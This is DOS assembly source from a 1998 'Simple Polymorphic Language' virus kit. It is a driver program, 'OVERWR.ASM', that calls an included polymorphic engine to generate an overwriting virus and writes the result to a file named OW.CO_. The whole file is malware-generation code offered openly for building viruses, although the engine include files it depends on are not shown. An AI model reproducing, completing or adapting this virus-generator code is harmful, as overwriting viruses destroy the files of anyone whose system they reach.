; SIMPLE POLYMORfIC LANGUAGE  Version 2.00 
; (c)1998 by ANAX, Greece.
;
; "OVERWR.ASM"
; This program calls the engine founded in overwr.spl  
; which will create an overwriting virus. Then writes
; that virus in a file called "OW.CO_"



CODE SEGMENT
ASSUME CS:CODE,DS:CODE,ES:CODE

org 0100h
OVERWR:

;print message
	mov ah,9
	push cs
	pop ds
	mov dx,offset message
	int 21h

;create file
	mov ah,3Ch
	mov cx,0
	mov dx,offset filename
	int 21h
	mov bx,ax



;create the two buffers in DS and ES
;MSDOS reserve all the merory for a program, so all memory
;from my PSP up to 640k is mine.
	mov ax,cs 
	add ax,512  ;keep 8192bytes for the program           
	mov ds,ax   
        add ax,512  ;keep another 8192 for DS buffer  
        mov es,ax   ;the rest, goes to ES buffer

;randomize all variables 
	call splrand

;call the engine
	mov dx,cs
	mov si,offset spldata
	call splVM

;now an overwriting virus is at DS:100h
;The variables table is at ES:000h-200h 

;write the virus
	mov ah,40h
	mov dx,100h
	mov cx,es:[OWVirusSize]	; 'OWVirusSize'  is a constand, defined 
				; in 'overwr.inc' and is pointing at
				; SPL's variable 'OWVirusSize' 	
	int 21h

;close the file
	mov ah,3Eh
	int 21h	

;exit to dos
	mov ah,4Ch
	int 21h

message DB "OVERWR  -  Overwriting Virus Generator",10,10,13
	db "This program demostrates the use of SPL v2.00",10,13
        db "It will create a file called OW.CO_ which contain",10,13
        db "an overwriting virus. ",10,13
        db " $"     
filename db "OW.CO_",0

;---------------------Here start SPL ----------------------
;Instead of copying the file OVERWR.inc in our virus file,
;you can use the following command:

INCLUDE OVERWR.INC
INCLUDE splVM.INC
INCLUDE splrand.INC


CODE ENDS
     END OVERWR                                                           
